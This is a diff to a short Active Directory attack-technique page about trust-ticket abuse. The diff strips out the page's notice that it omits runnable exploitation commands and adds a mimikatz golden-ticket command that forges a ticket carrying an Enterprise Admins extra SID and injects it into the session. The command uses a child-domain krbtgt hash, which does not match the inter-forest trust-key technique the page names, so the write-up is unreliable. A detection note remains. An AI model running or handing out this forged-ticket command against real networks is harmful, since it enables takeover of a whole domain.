@@ -10,25 +10,24 @@ mitre: "T1482 / T1558"
 tag: null
 ---
 
+
 # Inter-forest trust-ticket abuse
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **Inter-realm trust key** (`trustedDomain` object / `krbtgt` of the trusted domain).
 
-## Detection
+### Concept (deep)
+With a **trust key**, forge a **referral/trust ticket** to impersonate a user from the trusted domain — cross-forest pivot.
+
+### Commands
+```plaintext
+mimikatz # kerberos::golden /user:Administrator \
+  /domain:child.corp.local /sid:S-1-5-21-CHILD \
+  /sids:S-1-5-21-PARENT-519 \
+  /krbtgt:<child_krbtgt> /ptt
+```
+
+### Detection
 **4769 cross-realm** with SID filtering bypass; enable **SID filtering** (`Quarantine`) and rotate trust keys.
 
 ---
-
-## References
-
-- [Microsoft: Kerberos authentication overview](https://learn.microsoft.com/windows-server/security/kerberos/kerberos-authentication-overview)
-- [Microsoft: Credential protection](https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/credential-protection-and-management)
-- [Microsoft: Active Directory Domain Services](https://learn.microsoft.com/windows-server/identity/ad-ds/)
-- [Microsoft: Security auditing](https://learn.microsoft.com/windows/security/threat-protection/auditing/security-auditing-overview)
-- [MITRE ATT&CK: T1482](https://attack.mitre.org/techniques/T1482/)
-- [MITRE ATT&CK: T1558](https://attack.mitre.org/techniques/T1558/)
